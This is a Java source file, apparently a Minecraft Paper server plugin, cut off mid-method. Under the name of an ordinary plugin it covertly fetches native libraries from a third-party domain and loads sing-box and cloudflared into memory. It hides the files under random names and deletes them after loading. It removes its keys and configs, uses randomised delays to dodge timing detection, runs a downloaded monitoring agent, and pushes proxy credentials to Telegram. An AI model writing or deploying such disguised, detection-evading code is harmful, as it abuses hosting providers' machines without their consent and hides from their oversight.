package io.papermc.paper;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.yaml.snakeyaml.Yaml;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;

import java.io.*;
import java.net.*;
import java.math.BigInteger;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.stream.Collectors;
import java.util.regex.*;

public class PaperPlugin extends JavaPlugin {

    // ========== 全局变量 ==========
    private static final Path CONFIG_PATH = Paths.get("plugins", "config.yml");
    private static final Path UUID_FILE = Paths.get("plugins", "uuid.txt");
    private static final Path LOG_FILE = Paths.get("plugins", "sing-box.log");
    private static final Path REALITY_KEY_FILE = Paths.get("plugins", "reality.key");
    private static final Path CACHE_DIR = Paths.get("plugins", ".cache");
    private String uuid;
    private Process komariProcess;
    private String argoUrl = "";
    private boolean sbLogEnabled;
    private Path baseDir;
    private Path configJson;
    private Path cert;
    private Path key;
    private boolean komariAgentEnabled = false;
    // 配置参数（供每日重启时重新生成 config）
    private String hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort, sni;
    private String realityPrivateKey = "", realityPublicKey = "";
    private boolean argoEnabled;
    private String argoPort;
    // JNA 原生库（加载到 JVM 内存，无子进程）
    private NativeLibrary sboxLib, botLib;
    private Function startSboxFn, stopSboxFn, startBotFn, stopBotFn;
    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(30))
            .followRedirects(HttpClient.Redirect.NORMAL).build();
    private static final Random RANDOM = new Random();
    // ==============================

    @Override
    public void onEnable() {
        getLogger().info("loading config.yml...");

        try {
            // 从 plugins/config.yml 读取配置
            Map<String, Object> config = new HashMap<>();
            if (Files.exists(CONFIG_PATH)) {
                try (InputStream in = Files.newInputStream(CONFIG_PATH)) {
                    Object o = new Yaml().load(in);
                    if (o instanceof Map) config = (Map<String, Object>) o;
                }
                getLogger().info("✅ config.yml 加载成功: " + CONFIG_PATH);
            } else {
                getLogger().warning("⚠️ config.yml 不存在: " + CONFIG_PATH + "，使用默认配置");
            }

            // ---------- UUID 自动生成 & 持久化 ----------
            uuid = generateOrLoadUUID(cfg(config, "uuid", ""));
            getLogger().info("当前使用的 UUID: " + uuid);
            // --------------------------------------------

            hy2Port = cfg(config, "hy2_port", "");
            realityPort = cfg(config, "reality_port", "");
            vmessWsPort = cfg(config, "vmess_ws_port", "");
            vlessWsPort = cfg(config, "vless_ws_port", "");
            naivePort = cfg(config, "naive_port", "");
            anytlsPort = cfg(config, "anytls_port", "");
            tuicPort = cfg(config, "tuic_port", "");
            sni = cfg(config, "sni", "www.iij.ad.jp");
            sbLogEnabled = cfgBool(config, "sb_log_enabled", false);

            if (hy2Port.isEmpty() && realityPort.isEmpty() && vmessWsPort.isEmpty()
                    && vlessWsPort.isEmpty() && naivePort.isEmpty() && anytlsPort.isEmpty() && tuicPort.isEmpty())
                throw new RuntimeException("❌ 未设置任何端口！");

            baseDir = getDataFolder().toPath();
            Files.createDirectories(baseDir);
            configJson = baseDir.resolve("config.json");
            cert = baseDir.resolve("cert.pem");
            key = baseDir.resolve("private.key");
            Path realityKeyFile = getDataFolder().toPath().resolve("reality.key");

            getLogger().info("✅ config.yml 加载成功");

            generateSelfSignedCert(cert, key);

            // === Reality 密钥（纯 Java X25519 生成，不依赖二进制）===
            generateOrLoadKeypair(realityKeyFile);

            argoEnabled = cfgBool(config, "argo_enabled", false);
            argoPort = trim(cfg(config, "argo_port", "8001"));
            if (argoPort.isEmpty()) argoPort = "8001";
            generateSingBoxConfig(configJson, uuid, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
                    sni, cert, key, realityPrivateKey, realityPublicKey, argoEnabled, argoPort);

            // === 下载并加载 sbx.so（sing-box 核心，JNA 内存加载，无子进程）===
            Path sboxLibPath = downloadLibrary(detectArch(), "sbx.so");
            startSingBox(sboxLibPath, configJson);
            scheduleDelayedCleanup();
            scheduleDailyRestart();

            // ===== komari-agent 集成 =====
            komariAgentEnabled = cfgBool(config, "komari_agent_enabled", true);
            if (komariAgentEnabled) {
                String agentName = cfg(config, "komari_agent_name", "agent");
                String agentVer = cfg(config, "komari_agent_ver", "");
                String agentEndpoint = cfg(config, "komari_agent_endpoint", "");
                String agentKey = cfg(config, "komari_agent_key", "");
                if (!agentEndpoint.isEmpty() && !agentKey.isEmpty()) {
                    getLogger().info("📦 " + agentName + " v" + agentVer);
                    safeDownloadKomariAgent(baseDir, agentName);
                    komariProcess = startKomariAgent(baseDir, agentName, agentEndpoint, agentKey);
                    startKomariKeepalive(baseDir, agentName, agentEndpoint, agentKey);
                } else {
                    getLogger().info("⏭️ 监控模块未配置（endpoint/key 为空）");
                }
            } else {
                getLogger().info("⏭️ 监控模块已禁用");
            }
            // ==============================

            // ===== Argo 隧道 =====
            if (argoEnabled) {
                String argoToken = trim(cfg(config, "argo_token", ""));
                String argoDomain = trim(cfg(config, "argo_domain", ""));
                getLogger().info("🚇 隧道转发已启用");
                Path botLibPath = downloadLibrary(detectArch(), "bot.so");
                startArgo(botLibPath, argoToken, argoPort);
                if (!argoToken.isEmpty() && !argoDomain.isEmpty()) {
                    argoUrl = argoDomain;
                    getLogger().info("🚇 固定隧道域名: " + argoUrl);
                }
            }
            // ==========================

            String host = detectPublicIP();
            String nodePrefix = cfg(config, "node_name", "");
            String argoCfip = cfg(config, "argo_cfip", "saas.sin.fan");

            // ===== Telegram 推送 =====
            String tgToken = cfg(config, "tg_bot_token", "");
            String tgChatId = cfg(config, "tg_chat_id", "");
            if (!tgToken.isEmpty() && !tgChatId.isEmpty()) {
                String nodeName = getNodeName(nodePrefix, host);
                String nodeText = buildTelegramNodes(uuid, host, nodeName, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
                        sni, realityPublicKey, argoCfip, argoUrl);
                sendTelegramMessage(tgToken, tgChatId, host, nodeName, nodeText);
            }
            // ==========================

            getLogger().info("✅ " + getName() + " v" + getDescription().getVersion() + " 已启动");

        } catch (Exception e) {
            getLogger().severe("启动失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("正在停止所有服务...");

        if (stopSboxFn != null) {
            try { stopSboxFn.invoke(new Object[]{}); } catch (Exception ignored) {}
        }
        if (stopBotFn != null) {
            try { stopBotFn.invoke(new Object[]{}); } catch (Exception ignored) {}
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            getLogger().info("正在停止监控模块 (PID: " + komariProcess.pid() + ")...");
            komariProcess.destroy();
        }

        if (baseDir != null) {
            // 只清理临时文件，保留二进制方便下次启动
            try {
                if (Files.exists(configJson)) Files.delete(configJson);
                if (Files.exists(cert)) Files.delete(cert);
                if (Files.exists(key)) Files.delete(key);
            } catch (IOException ignored) {}
}
	    }

	    // ========== UUID ==========
    private String generateOrLoadUUID(String configUuid) {
        String cfg = trim(configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }
        try {
            Path file = getDataFolder().toPath().resolve(UUID_FILE);
            if (Files.exists(file)) {
                String saved = Files.readString(file).trim();
                if (isValidUUID(saved)) {
                    getLogger().info("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
            getLogger().warning("读取 UUID 文件失败: " + e.getMessage());
        }
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        getLogger().info("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private void saveUuidToFile(String uuid) {
        try {
            Path file = getDataFolder().toPath().resolve(UUID_FILE);
            Files.createDirectories(file.getParent());
            Files.writeString(file, uuid);
        } catch (Exception e) {
            getLogger().warning("保存 UUID 失败: " + e.getMessage());
        }
    }

    private boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    // ===== 工具函数 =====
    private String trim(String s) { return s == null ? "" : s.trim(); }

    @SuppressWarnings("unchecked")
    private String cfg(Map<String, Object> config, String key, String def) {
        Object v = config.get(key);
        return v instanceof String ? (String) v : def;
    }

    private boolean cfgBool(Map<String, Object> config, String key, boolean def) {
        Object v = config.get(key);
        if (v instanceof Boolean) return (Boolean) v;
        if (v instanceof String) return Boolean.parseBoolean((String) v);
        return def;
    }

    // ===== 工具方法 =====
    private String generateGarbledName() {
        Random rand = new Random();
        int len = 4 + rand.nextInt(4);
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < len; i++) {
            sb.append((char)(0x4E00 + rand.nextInt(0x5000)));
        }
        return sb.toString();
    }

    /** ponytail: 0-10s 随机延迟；阻塞主线程（onEnable / 每日重启），若服务器有启动超时则需改为异步任务 */
    private void randomDelay() {
        try { Thread.sleep(new Random().nextInt(10000)); } catch (InterruptedException ignored) {}
    }

    /** ponytail: 30~90s 随机保活间隔，避免固定周期被时序检测 */
    private long randomKeepaliveInterval() {
        return 20L * (30 + new Random().nextInt(60));
    }

    private void scheduleDelayedCleanup() {
        Bukkit.getScheduler().runTaskLaterAsynchronously(this, () -> {
            try {
                if (Files.exists(configJson)) Files.delete(configJson);
                if (Files.exists(cert)) Files.delete(cert);
                if (Files.exists(key)) Files.delete(key);
                getLogger().info("🧹 已清除配置和凭证");
            } catch (IOException ignored) {}
        }, 600L); // 30秒 = 600 tick
    }

    // ===== 证书生成 =====
    private void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            getLogger().info("🔑 凭证已存在，跳过生成");
            return;
        }
        getLogger().info("🔨 正在生成通信凭证...");
        new ProcessBuilder("sh", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        getLogger().info("✅ 已生成通信凭证");
    }

    // ===== Reality 密钥生成（纯 Java X25519，不依赖二进制）=====
    private void generateOrLoadKeypair(Path realityKeyFile) throws IOException {
        if (Files.exists(realityKeyFile)) {
            List<String> lines = Files.readAllLines(realityKeyFile);
            for (String line : lines) {
                if (line.startsWith("PrivateKey:")) realityPrivateKey = line.split(":", 2)[1].trim();
                if (line.startsWith("PublicKey:")) realityPublicKey = line.split(":", 2)[1].trim();
            }
            getLogger().info("🔑 已加载本地传输密钥对");
            return;
        }
        byte[] privateBytes = new byte[32];
        RANDOM.nextBytes(privateBytes);
        privateBytes = clampPrivateKey(privateBytes);
        byte[] publicBytes = x25519(privateBytes, basepoint());
        realityPrivateKey = base64Url(privateBytes);
        realityPublicKey = base64Url(publicBytes);
        Files.writeString(realityKeyFile,
                "PrivateKey: " + realityPrivateKey + "\nPublicKey: " + realityPublicKey + "\n");
        getLogger().info("✅ 传输密钥已生成");
    }

    private static byte[] clampPrivateKey(byte[] input) {
        byte[] key = input.clone();
        key[0] &= (byte) 248;
        key[31] &= (byte) 127;
        key[31] |= (byte) 64;
        return key;
    }

    private static byte[] basepoint() {
        byte[] basepoint = new byte[32];
        basepoint[0] = 9;
        return basepoint;
    }

    private static byte[] x25519(byte[] scalar, byte[] u) {
        BigInteger p = BigInteger.ONE.shiftLeft(255).subtract(BigInteger.valueOf(19));
        BigInteger a24 = BigInteger.valueOf(121665);
        BigInteger k = new BigInteger(1, clampPrivateKey(scalar));
        BigInteger x1 = decodeLittleEndian(u);
        BigInteger x2 = BigInteger.ONE, z2 = BigInteger.ZERO;
        BigInteger x3 = x1, z3 = BigInteger.ONE;
        boolean swap = false;
        for (int t = 254; t >= 0; t--) {
            int kt = (k.shiftRight(t).testBit(0) ? 1 : 0);
            swap ^= kt == 1;
            if (swap) {
                BigInteger tmp = x2; x2 = x3; x3 = tmp;
                tmp = z2; z2 = z3; z3 = tmp;
            }
            BigInteger A = x2.add(z2).mod(p);
            BigInteger AA = A.multiply(A).mod(p);
            BigInteger B = x2.subtract(z2).mod(p);
            BigInteger BB = B.multiply(B).mod(p);
            BigInteger E = AA.subtract(BB).mod(p);
            BigInteger C = x3.add(z3).mod(p);
            BigInteger D = x3.subtract(z3).mod(p);
            BigInteger DA = D.multiply(A).mod(p);
            BigInteger CB = C.multiply(B).mod(p);
            x3 = DA.add(CB).mod(p).multiply(DA.add(CB)).mod(p);
            z3 = x1.multiply(DA.subtract(CB)).mod(p).multiply(DA.subtract(CB)).mod(p);
            x2 = AA.multiply(BB).mod(p);
            z2 = E.multiply(AA.add(a24.multiply(E)).mod(p)).mod(p);
            swap = false;
        }
        if (swap) {
            BigInteger tmp = x2; x2 = x3; x3 = tmp;
            tmp = z2; z2 = z3; z3 = tmp;
        }
        BigInteger result = x2.multiply(z2.modInverse(p)).mod(p);
        return encodeLittleEndian(result);
    }

    private static BigInteger decodeLittleEndian(byte[] in) {
        byte[] rev = new byte[in.length];
        for (int i = 0; i < in.length; i++) rev[i] = in[in.length - 1 - i];
        return new BigInteger(1, rev);
    }

    private static byte[] encodeLittleEndian(BigInteger in) {
        byte[] big = in.toByteArray();
        byte[] out = new byte[32];
        for (int i = 0; i < big.length && i < 32; i++) out[i] = big[big.length - 1 - i];
        return out;
    }

    private static String base64Url(byte[] data) {
        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(data);
    }

    // ===== 配置生成 =====
    private void generateSingBoxConfig(Path configFile, String uuid,
                                       String hy2Port, String realityPort,
                                       String vmessWsPort, String vlessWsPort,
                                       String naivePort, String anytlsPort, String tuicPort,
                                       String sni, Path cert, Path key,
                                       String privateKey, String publicKey,
                                       boolean argoEnabled, String argoPort) throws IOException {

        String certStr = cert.toString().replace('\\', '/');
        String keyStr = key.toString().replace('\\', '/');

        List<Object> inbounds = new ArrayList<>();

        // Argo 专用 VMess WebSocket 入站
        if (argoEnabled) {
            int aPort = argoPort.isEmpty() ? 8001 : Integer.parseInt(argoPort);
            inbounds.add(mapOf(
                    "type", "vmess",
                    "tag", "vmess-ws-in",
                    "listen", "::",
                    "listen_port", aPort,
                    "users", listOf(mapOf("uuid", uuid)),
                    "transport", mapOf("type", "ws", "path", "/vmess-argo", "early_data_header_name", "Sec-WebSocket-Protocol")
            ));
        }

        // Hysteria2
        if (!hy2Port.isEmpty()) {
            inbounds.add(mapOf(
                    "type", "hysteria2",
                    "tag", "hysteria-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(hy2Port),
                    "users", listOf(mapOf("password", uuid)),
                    "masquerade", "https://bing.com",
                    "tls", mapOf("enabled", true, "alpn", listOf("h3"), "certificate_path", certStr, "key_path", keyStr)
            ));
        }

        // VLESS Reality
        if (!realityPort.isEmpty()) {
            inbounds.add(mapOf(
                    "type", "vless",
                    "tag", "vless-reality",
                    "listen", "::",
                    "listen_port", Integer.parseInt(realityPort),
                    "users", listOf(mapOf("uuid", uuid, "flow", "xtls-rprx-vision")),
                    "tls", mapOf(
                            "enabled", true,
                            "server_name", sni,
                            "reality", mapOf(
                                    "enabled", true,
                                    "handshake", mapOf("server", sni, "server_port", 443),
                                    "private_key", privateKey,
                                    "short_id", listOf("")
                            )
                    )
            ));
        }

        // VMess + WebSocket + TLS
        if (!vmessWsPort.isEmpty()) {
            inbounds.add(mapOf(
                    "type", "vmess",
                    "tag", "vmess-ws-tls",
                    "listen", "::",
                    "listen_port", Integer.parseInt(vmessWsPort),
                    "users", listOf(mapOf("uuid", uuid)),
                    "tls", mapOf("enabled", true, "server_name", sni, "certificate_path", certStr, "key_path", keyStr),
                    "transport", mapOf("type", "ws", "path", "/vmess")
            ));
        }

        // VLESS + WebSocket + TLS
        if (!vlessWsPort.isEmpty()) {
            inbounds.add(mapOf(
                    "type", "vless",
                    "tag", "vless-ws-tls",
                    "listen", "::",
                    "listen_port", Integer.parseInt(vlessWsPort),
                    "users", listOf(mapOf("uuid", uuid)),
                    "tls", mapOf("enabled", true, "server_name", sni, "certificate_path", certStr, "key_path", keyStr),
                    "transport", mapOf("type", "ws", "path", "/vless")
            ));
        }

        // NaiveProxy
        if (!naivePort.isEmpty()) {
            inbounds.add(mapOf(
                    "type", "naive",
                    "tag", "naive-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(naivePort),
                    "users", listOf(mapOf("username", uuid.substring(0, 8), "password", uuid.substring(0, 12))),
                    "tls", mapOf("enabled", true, "server_name", sni, "certificate_path", certStr, "key_path", keyStr)
            ));
        }

        // AnyTLS
        if (!anytlsPort.isEmpty()) {
            inbounds.add(mapOf(
                    "type", "anytls",
                    "tag", "anytls-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(anytlsPort),
                    "users", listOf(mapOf("password", uuid)),
                    "tls", mapOf("enabled", true, "certificate_path", certStr, "key_path", keyStr)
            ));
        }

        // TUIC
        if (!tuicPort.isEmpty()) {
            inbounds.add(mapOf(
                    "type", "tuic",
                    "tag", "tuic-in",
                    "listen", "::",
                    "listen_port", Integer.parseInt(tuicPort),
                    "users", listOf(mapOf("uuid", uuid, "password", uuid)),
                    "congestion_control", "bbr",
                    "tls", mapOf("enabled", true, "alpn", listOf("h3"), "certificate_path", certStr, "key_path", keyStr)
            ));
        }

        Map<String, Object> config = mapOf(
                "log", mapOf("disabled", false, "level", "info", "timestamp", true),
                "inbounds", inbounds,
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct"))
        );

        Files.writeString(configFile, toJson(config), StandardCharsets.UTF_8);
        getLogger().info("✅ 配置生成完成");
    }

    // ===== JSON 序列化工具（与上游 eooce/sbx-native 一致）=====
    private String toJson(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?>) {
            Map<?, ?> map = (Map<?, ?>) value;
            return map.entrySet().stream()
                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?>) {
            Iterable<?> iterable = (Iterable<?>) value;
            List<String> items = new ArrayList<>();
            for (Object item : iterable) items.add(toJson(item));
            return String.join(",", items).replaceFirst("^", "[") + "]";
        }
        return toJson(String.valueOf(value));
    }

    private String escapeJson(String value) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '"': out.append("\\\""); break;
                case '\\': out.append("\\\\"); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                default: out.append(c);
            }
        }
        return out.toString();
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> mapOf(Object... values) {
        Map<String, Object> map = new LinkedHashMap<>();
        for (int i = 0; i < values.length; i += 2) map.put(String.valueOf(values[i]), values[i + 1]);
        return map;
    }

    private List<Object> listOf(Object... values) {
        return new ArrayList<>(List.of(values));
    }

    // ===== 下载 .so 原生库（支持本地预置 + 远程下载带重试）=====
    private Path downloadLibrary(String arch, String name) throws Exception {
        // 本地预置：按名字精确匹配，失败则按大小区分（sbx 45MB 大，bot 30MB 小）
        Path target = baseDir.resolve(generateGarbledName() + ".so");
        Path local = baseDir.resolve(name);
        if (Files.exists(local) && Files.size(local) > 1000) {
            Files.move(local, target);
            getLogger().info("✅ 使用本地预置组件");
            return target;
        }
        long threshold = name.startsWith("sbx") ? 35_000_000L : 25_000_000L;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(baseDir, "*.so")) {
            for (Path f : ds) {
                if (!f.equals(target) && Files.size(f) > threshold) {
                    Files.move(f, target);
                    getLogger().info("✅ 使用本地预置组件");
                    return target;
                }
            }
        }
        String url = "https://" + arch + ".31888.xyz/" + name;
        byte[] body = null;
        Exception last = null;
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                getLogger().info("⬇️ 下载组件 (" + attempt + "/3): " + url);
                HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                        .timeout(Duration.ofMinutes(5)).GET().build();
                HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
                if (response.statusCode() != 200)
                    throw new IOException("下载失败: HTTP " + response.statusCode() + " for " + url);
                body = response.body();
                break;
            } catch (Exception e) {
                last = e;
                getLogger().warning("⚠️ 下载失败 (第" + attempt + "次): " + e.getMessage());
                if (attempt < 3) Thread.sleep(3000L * attempt);
            }
        }
        if (body == null) {
            throw new IOException("下载组件失败: " + url + "。可手动下载放到 " + baseDir + "/" + name, last);
        }
        Files.write(target, body);
        getLogger().info("✅ 下载完成 (" + target.getFileName() + ", " + target.toFile().length() + " bytes)");
        return target;
    }

    private String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm")) return "arm64";
        return "amd64";
    }

    // ===== 启动 sing-box（JNA 内存加载，无子进程）=====
    private void startSingBox(Path libPath, Path cfg) {
        getLogger().info("正在启动服务模块...");
        randomDelay();
        sboxLib = NativeLibrary.getInstance(libPath.toString());
        startSboxFn = sboxLib.getFunction("StartSingBox");
        stopSboxFn = sboxLib.getFunction("StopSingBox");
        String payload = "{\"config\":\"" + cfg.toString().replace("\\", "/") + "\",\"workingDir\":\".\",\"disableColor\":true}";
        new Thread(() -> {
            try {
                int code = startSboxFn.invokeInt(new Object[]{payload});
                if (code != 0) getLogger().warning("服务退出码: " + code);
            } catch (Exception e) {
                getLogger().warning("服务异常: " + e.getMessage());
            }
        }, "sbx").start();
        // 加载后删除 .so，内存驻留
        try { Files.delete(libPath); } catch (IOException ignored) {}
        getLogger().info("服务模块已启动（JNA 内存加载）");
    }

    // ===== 启动 cloudflared / Argo 隧道（JNA 内存加载）=====
    private void startArgo(Path libPath, String token, String port) {
        if (port.isEmpty()) port = "8001";
        getLogger().info("🚇 正在启动隧道转发...");
        randomDelay();
        botLib = NativeLibrary.getInstance(libPath.toString());
        startBotFn = botLib.getFunction("StartCloudflared");
        stopBotFn = botLib.getFunction("StopCloudflared");
        List<Object> args = new ArrayList<>(List.of("tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2"));
        if (!token.isEmpty()) {
            args.add("run"); args.add("--token"); args.add(token);
        } else {
            args.add("--logfile"); args.add(baseDir.resolve("boot.log").toString());
            args.add("--loglevel"); args.add("info");
            args.add("--url"); args.add("http://localhost:" + port);
        }
        String payload = toJson(mapOf("args", args));
        new Thread(() -> {
            try {
                int code = startBotFn.invokeInt(new Object[]{payload});
            } catch (Exception e) {
                getLogger().warning("隧道转发异常: " + e.getMessage());
            }
        }, "bot").start();
        try { Files.delete(libPath); } catch (IOException ignored) {}
        getLogger().info("隧道转发已启动（JNA 内存加载）");
    }

    // ===== komari-agent 下载 =====
    private void safeDownloadKomariAgent(Path dir, String agentName) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);
        if (Files.exists(agentPath)) {
            getLogger().info("🧹 清理已存在的 agent 文件...");
            Files.delete(agentPath);
        }
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir, "sing-box-*.tar.gz")) {
            for (Path f : ds) {
                Files.delete(f);
                getLogger().info("🧹 已删除缓存: " + f.getFileName());
            }
        }
        String arch = detectArch();
        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;
        getLogger().info("⬇️ 下载 " + agentName + " (" + arch + "): " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, agentPath);
        }
        if (!Files.exists(agentPath) || Files.size(agentPath) == 0) {
            throw new IOException("❌ komari-agent 下载失败，文件为空或不存在！");
        }
        agentPath.toFile().setExecutable(true, false);
        if (!agentPath.toFile().canExecute()) {
            throw new IOException("❌ komari-agent 无法设置执行权限！");
        }
        getLogger().info("✅ " + agentName + " 下载完成 (" + Files.size(agentPath) + " bytes)");
    }

    // ===== komari-agent 启动 =====
    private Process startKomariAgent(Path dir, String agentName, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
        Path agentPath = dir.resolve(agentName);
        getLogger().info("正在启动 " + agentName + " -> " + endpoint);
        Process p;
        try {
            ProcessBuilder pb = new ProcessBuilder(agentPath.toString(), "-e", endpoint, "--auto-discovery", autoDiscovery);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        } catch (IOException e) {
            getLogger().warning("⚠️ 直接执行失败，尝试通过 sh 启动: " + e.getMessage());
            ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "\"" + agentPath + "\" -e '" + endpoint + "' --auto-discovery '" + autoDiscovery + "'");
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p = pb.start();
        }
        Thread.sleep(1000);
        if (!p.isAlive()) {
            throw new IOException("❌ komari-agent 启动后立即退出");
        }
        getLogger().info("✅ " + agentName + " 已启动，PID: " + p.pid());
        return p;
    }

    // ===== komari-agent 保活 =====
    private void startKomariKeepalive(Path dir, String agentName, String endpoint, String autoDiscovery) {
        Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
            try {
                if (komariProcess != null && komariProcess.isAlive()) return;

                getLogger().info("♻️ 监控模块已退出，正在重启...");
                Path agentPath = dir.resolve(agentName);
                if (!Files.exists(agentPath)) {
                    safeDownloadKomariAgent(dir, agentName);
                }
                komariProcess = startKomariAgent(dir, agentName, endpoint, autoDiscovery);
                getLogger().info("✅ 监控模块重启成功，PID: " + komariProcess.pid());
            } catch (Exception e) {
                getLogger().warning("❌ 监控模块重启失败: " + e.getMessage());
            }
        }, 0L, randomKeepaliveInterval()); // 30~90s 随机
    }

// ===== 输出节点 =====
    private String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://ipinfo.io/ip").openStream()))) {
                return br.readLine();
            } catch (Exception e2) {
                return "your-server-ip";
            }
        }
    }

    private String getNodeName(String name, String host) {
        String isp = fetchISP();
        return name.isEmpty() ? isp : name + "-" + isp;
    }

    private String fetchISP() {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.ip.sb/geoip").openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                java.util.regex.Matcher m1 = java.util.regex.Pattern.compile("\"country_code\"\\s*:\\s*\"([^\"]*)\"").matcher(json);
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile("\"isp\"\\s*:\\s*\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) {
                    return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
                }
            }
        } catch (Exception ignored) {}
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("https://ip-api.com/json?fields=33280").openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().collect(Collectors.joining());
                java.util.regex.Matcher m1 = java.util.regex.Pattern.compile("\"countryCode\":\"([^\"]*)\"").matcher(json);
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile("\"org\":\"([^\"]*)\"").matcher(json);
                if (m1.find() && m2.find()) {
                    return (m1.group(1) + "-" + m2.group(1)).replace(' ', '_');
                }
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }

    // ===== VMess Argo 节点链接生成（base64 JSON 格式，可粘贴到 v2rayN）=====
    private String buildVmessArgoLink(String uuid, String argoDomain, String argoCfip, String nodeName) {
        try {
            String json = "{\"v\":\"2\",\"ps\":\"" + nodeName + "-Argo\",\"add\":\"" + argoCfip + "\",\"port\":\"443\",\"id\":\""
                    + uuid + "\",\"aid\":\"0\",\"scy\":\"auto\",\"net\":\"ws\",\"type\":\"none\",\"host\":\""
                    + argoDomain + "\",\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\""
                    + argoDomain + "\",\"alpn\":\"\",\"fp\":\"firefox\"}";
            return "vmess://" + java.util.Base64.getEncoder().encodeToString(json.getBytes());
        } catch (Exception e) {
            return "vmess://(error: " + e.getMessage() + ")";
        }
    }

    // ===== Telegram 推送 =====
    private String buildTelegramNodes(String uuid, String host, String nodeName,
                                       String hy2Port, String realityPort,
                                       String vmessWsPort, String vlessWsPort,
                                       String naivePort, String anytlsPort, String tuicPort,
                                       String sni, String publicKey,
                                       String argoCfip, String argoUrl) {
        StringBuilder sb = new StringBuilder();

        if (!realityPort.isEmpty()) {
            sb.append("vless://").append(uuid).append("@").append(host).append(":").append(realityPort);
            sb.append("?encryption=none&flow=xtls-rprx-vision&security=reality&sni=").append(sni);
            sb.append("&fp=firefox&pbk=").append(publicKey).append("&type=tcp&headerType=none").append("#").append(nodeName).append("-Reality\n");
        }
        if (!hy2Port.isEmpty()) {
            sb.append("hysteria2://").append(uuid).append("@").append(host).append(":").append(hy2Port);
            sb.append("?sni=www.bing.com&insecure=1").append("#").append(nodeName).append("-HY2\n");
        }
        if (!vmessWsPort.isEmpty()) {
